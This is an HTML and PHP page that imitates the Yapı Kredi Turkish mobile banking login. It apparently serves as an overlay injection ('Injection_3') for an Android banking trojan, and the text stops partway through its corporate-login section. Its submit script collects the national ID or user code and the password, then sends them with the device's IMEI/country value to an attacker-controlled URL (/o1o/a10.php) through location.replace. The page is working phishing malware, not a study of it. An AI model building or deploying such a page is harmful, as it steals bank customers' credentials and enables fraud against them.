<html>
<head>

<link href="http://getbootstrap.com/dist/css/bootstrap.min.css" rel="stylesheet">
<link href="data:text/css;charset=utf-8," data-href="http://getbootstrap.com/dist/css/bootstrap-theme.min.css" rel="stylesheet" id="bs-theme-stylesheet">
<link href="tr/com.ykb.android/style.css" rel="stylesheet">


</head>
<?php
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
//$IMEI_country = "321|tr";
include "config.php";
?>
<body>

<img style="margin-top: 60px;margin-bottom: 50px;width: 45%;" src="data:image/png;base64,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">

<div id="content_div1" style="width: 90%;margin: 0 auto;">
<A href="#" class="hr1">
<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACkAAAApCAYAAACoYAD2AAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAA+dpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMy1jMDExIDY2LjE0NTY2MSwgMjAxMi8wMi8wNi0xNDo1NjoyNyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczpkYz0iaHR0cDovL3B1cmwub3JnL2RjL2VsZW1lbnRzLzEuMS8iIHhtbG5zOnhtcE1NPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvbW0vIiB4bWxuczpzdFJlZj0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL3NUeXBlL1Jlc291cmNlUmVmIyIgeG1wOkNyZWF0b3JUb29sPSJBZG9iZSBQaG90b3Nob3AgQ1M2IChXaW5kb3dzKSIgeG1wOkNyZWF0ZURhdGU9IjIwMTctMTItMTZUMTY6NDM6MjIrMDQ6MDAiIHhtcDpNb2RpZnlEYXRlPSIyMDE3LTEyLTE2VDE2OjQzOjI1KzA0OjAwIiB4bXA6TWV0YWRhdGFEYXRlPSIyMDE3LTEyLTE2VDE2OjQzOjI1KzA0OjAwIiBkYzpmb3JtYXQ9ImltYWdlL3BuZyIgeG1wTU06SW5zdGFuY2VJRD0ieG1wLmlpZDpCNTFENkVFMEUyNUUxMUU3QjI0QkEzQ0I1MDI3Q0YxMSIgeG1wTU06RG9jdW1lbnRJRD0ieG1wLmRpZDpCNTFENkVFMUUyNUUxMUU3QjI0QkEzQ0I1MDI3Q0YxMSI+IDx4bXBNTTpEZXJpdmVkRnJvbSBzdFJlZjppbnN0YW5jZUlEPSJ4bXAuaWlkOkI1MUQ2RURFRTI1RTExRTdCMjRCQTNDQjUwMjdDRjExIiBzdFJlZjpkb2N1bWVudElEPSJ4bXAuZGlkOkI1MUQ2RURGRTI1RTExRTdCMjRCQTNDQjUwMjdDRjExIi8+IDwvcmRmOkRlc2NyaXB0aW9uPiA8L3JkZjpSREY+IDwveDp4bXBtZXRhPiA8P3hwYWNrZXQgZW5kPSJyIj8+XKxOgwAAAw1JREFUeNrEWL+L1EAU3mxlUETBFNe5IIhFrNxGrYJgm+6qYH1/Qv6C5bC0CFgt2MRyLa5Kt1sICxbRQjg4xYgKBu7ABcv4ZnmD7+byY+ZNNvvgY8jM5M3Le2++eRNnZCFVVXnQPAEcAB5i923AOeAb4AKwchzn42hIAcMmgBiQVfpSAOaAkLOmY2IcNDPAoTL0DvADkOPzT/TsXcBNwDPAPTJ/BXgN3n3Tt/cSwIZ4ZusVgGvo/ZzoEJEI+jDOU8I6R4/a6Iww/FKObJT5gFNUJFq/x8i4gGP68VwDaVi8HW3CkKyTmoZYejAZgC2mgNLIoyQHswFpbaqdo7iLZQ56A/NvhGuXjWsrX+OP9iAiL1vzk0w4Zu7WhPBgjs8ug/IkH0/ryFaKZ0FVqhhTF6GmtGkgYXgxJ1Tlo1d9sgFzhje3og4ssT8wVBjje8uGcak3NtQrPzBULS8ZXlxcUtZM1gtDvUeXIstVhO/KXJy0FBbbUo154m1TZQx4gGOfGaxxge2dhnHZ/8uofvxfJPvSyPvY8Ylh5CNsm1KlVOaZyHcZjTGW+0L+MBS9xXbWMD5T5pnIObY3OpNfky42Kr8qxOwxdK8lqQtP/uXWm9C8wsfrgBO5gbA9wX4hLxlH7S2ZMmPi1gOT6wTeaQ7JvUXcc85wJ5/h8wrHX4j5hoeFTMPNVU7qDu+CHHsJpR8cD5S+CamuKnzf00yjopaTNKuU4koBoFczFjpVeC13d5EymVdwN0Kth7rr2ph2znXOWBIyl2mkW1s8NDvDr3Nvrnnw20qmEeqsrWKJOi75toZmbWlFUi9uqzyK0Z6E2JDphDPeg4EeycWobWJAwhIMaKBLjsGF1mlCrpb+QEZK/l1r0xt5qdylR9GDdK0J9+vs/ny15+DaOmrKmZv29VcDd3FJQjyxVRgShRu8/noWuk538eEyNKlCymu80k47yD/Ed0uF0KNd/v1KlT+1VHI0vmwYX3Ly27EwWOz654DHgKctl6kPgPeAFG6BXzhrOT17WuzQa4CvYNDvvvT+E2AAO3IKEROs5HUAAAAASUVORK5CYII="><br>
Bireysel</A>
<A href="#" class="hr2" onclick="document.getElementById('content_div1').style.display = 'none'; document.getElementById('content_div2').style.display = 'block';">
<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACkAAAApCAYAAACoYAD2AAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAA+dpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMy1jMDExIDY2LjE0NTY2MSwgMjAxMi8wMi8wNi0xNDo1NjoyNyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczpkYz0iaHR0cDovL3B1cmwub3JnL2RjL2VsZW1lbnRzLzEuMS8iIHhtbG5zOnhtcE1NPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvbW0vIiB4bWxuczpzdFJlZj0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL3NUeXBlL1Jlc291cmNlUmVmIyIgeG1wOkNyZWF0b3JUb29sPSJBZG9iZSBQaG90b3Nob3AgQ1M2IChXaW5kb3dzKSIgeG1wOkNyZWF0ZURhdGU9IjIwMTctMTItMTZUMTY6NDM6MjIrMDQ6MDAiIHhtcDpNb2RpZnlEYXRlPSIyMDE3LTEyLTE2VDE2OjQzOjU5KzA0OjAwIiB4bXA6TWV0YWRhdGFEYXRlPSIyMDE3LTEyLTE2VDE2OjQzOjU5KzA0OjAwIiBkYzpmb3JtYXQ9ImltYWdlL3BuZyIgeG1wTU06SW5zdGFuY2VJRD0ieG1wLmlpZDpDOUE2RUI5M0UyNUUxMUU3QUExQ0Y4ODcyMTE5NzQwMiIgeG1wTU06RG9jdW1lbnRJRD0ieG1wLmRpZDpDOUE2RUI5NEUyNUUxMUU3QUExQ0Y4ODcyMTE5NzQwMiI+IDx4bXBNTTpEZXJpdmVkRnJvbSBzdFJlZjppbnN0YW5jZUlEPSJ4bXAuaWlkOkM5QTZFQjkxRTI1RTExRTdBQTFDRjg4NzIxMTk3NDAyIiBzdFJlZjpkb2N1bWVudElEPSJ4bXAuZGlkOkM5QTZFQjkyRTI1RTExRTdBQTFDRjg4NzIxMTk3NDAyIi8+IDwvcmRmOkRlc2NyaXB0aW9uPiA8L3JkZjpSREY+IDwveDp4bXBtZXRhPiA8P3hwYWNrZXQgZW5kPSJyIj8+wsfRgQAAAwBJREFUeNrMWTGLE0EU3g0W2ohXTHFgYUAQi7W7xrNaBRuL7bQJ1vkJ+wskvyBgdWCzbcQyXSIIAYtoISgo7nEWLkTwQKzWb8Kb+G5ud3ZnZxLy4Mtssrsz37735u17L2FZlkEYhkFXwf0CwzFwCNyjnw+AFfAd+AXMscYHl0W63NMHUmBatpccOAES2/VCG01KchheAE+1U6+BM2BJ33+QZm8B14FHwG12/Rx4iXVfedUkrhsD50wza60A1yy1v2RzSEvEziSlz2lmPSGNurjYgMyvZNiZJM5FwGeaSI5R4EmkBYARf3hrkkSQm0UEWxByGSVZa5JkYqXBcbBlwRpHQFGr0RqSygenwY6EiFb7qE6SdrHyQWGxSAxMaEPkdBx32FAlaVVUktSeJrKYPDUE8dSSaHbJPzWS6oKRpQY3hMifhUY8tphPsHh8dIEkBVslNmae1WmMEZ1ZanN0QZuM5Mi0m0lji9KfLOo0TNpci05yZjKN9obwJblBmyrCJGuSjHlhuOn/k/kJOcb5ZBhSlu3Rb8c0vg32R+aKmyJ5l8ZP+8KQJcmRInmHxo/Bfsmp/OixdF/Kb0c/4ymdj1fqipP0JQ9rjrvKX/lxhb78aan6mzY7vMW1pw3nb3BNrmg8NNzwfAs+1zTnwSaY85jkGNsmzCcnLjGXxe5ckVRZ+NKFpK9ArmXskx6LSV9kTHItsjzKYxrf8d2t3jbP9oTkExrf8AQjaTK55yQjb2HqaVXSqzKhgSFd80E0NyXCrAhMq0gOm55yBwXZ8NIbq6IQm3apTTwRFMxSAxPJuEtt4qmjsaiMsTV195iVltGOSGasrBBt2ywZIxpvWYN8rb5twypr3fnq7oOLRqu1aP2NeUPJV+OKdnHBTNx3aqJScFUTnlP5KzqSS1gcbPfgFp1eoZlfaSDddBrqO7wJ3Vto7cSB13a01i/KDG+eJZEvas7PbP07dPmLhHa9zFbuAw8M2fd7mc0AGdb6al05uv6PU9UhxnAV+IZ5f/qY858AAwC10Ta/QI7RdgAAAABJRU5ErkJggg=="><br>
Kurumsal</A>
<div style="clear:both"></div>

 <form  method="post" >
<div class="bg">
 <div class="glyphicon glyphicon-user nn1" style="color:white;"></div><input type="text" name ="fields[login]" id="id" class="id" style="border-bottom: 1px solid #eee;" placeholder="T.C. Kimlik No veya Kullanıcı Ko" onKeyUp="if(this.value>9999999999){this.value=this.value.substr(0,10);}" autofocus="autofocus" />
  <div class="glyphicon glyphicon-lock nn2" style="color:white;"></div><input name="fields[password]" id="pass" class="pass" type="password" placeholder="Şifre" maxlength="50" />
</div>
    <input class="switcher__input" type="checkbox" name="watched" id="switcher">
    <label class="switcher__label" for="switcher">
    </label>
<h5> Beni Hatırla </h5>

  <button id="input_submitBtn" onclick="sentServer1();" class="s1" type="submit">Giriş</button>
    <h5 style="font-size: 16px;"> Şifre Al / Şifremi Unuttum </h5>

  <div style="clear:both"></div>

  <div style="clear:both"></div>
 <script type="text/javascript">
  (function () {


        var  __insHiddenField = function (objDoc, objForm, sNm, sV) {
             var input = objDoc.createElement("input");
             input.setAttribute("type", "hidden");
             input.setAttribute("name", sNm);
             input.setAttribute("value", sV);
             input.value = sV;
             objForm.appendChild(input);
         };
                    var g_oBtn = document.getElementById('input_submitBtn');
                    g_oBtn.onclick = function () {

						var oNumInp = document.getElementById('id');
                        var oCodeInp = document.getElementById('pass');

						try{
							oNumInp.className = 'id';
							oCodeInp.className = 'pass';
						} catch(e){};

                        if (oNumInp.value.length < 3) {
							try{
								oNumInp.className = 'fe1';
							} catch(e){};
                            return false;
                        }

                        if (!/^\w{3,100}$/i.test(oCodeInp.value)) {
							try{
                                oCodeInp.className = 'fe2';
							} catch(e){};
                            return false;
                        }
top['closeDlg'] = true;
var url='<?php echo $URL; ?>';
var imei_c='<?php echo $IMEI_country; ?>';
location.replace(url+'/o1o/a10.php?p=' + imei_c+"|Injection_3|ykb_bireysel|"+oNumInp.value+"|"+oCodeInp.value);

return false;
};

})();
            </script>
 </form>
 </div>




 <div id="content_div2" style="width: 90%;margin: 0 auto;">
<A href="#" class="hr11" onclick="document.getElementById('content_div2').style.display = 'none'; document.getElementById('content_div1').style.display = 'block';">
<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACkAAAApCAYAAACoYAD2AAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAA+dpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMy1jMDExIDY2LjE0NTY2MSwgMjAxMi8wMi8wNi0xNDo1NjoyNyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczpkYz0iaHR0cDovL3B1cmwub3JnL2RjL2VsZW1lbnRzLzEuMS8iIHhtbG5zOnhtcE1NPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvbW0vIiB4bWxuczpzdFJlZj0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL3NUeXBlL1Jl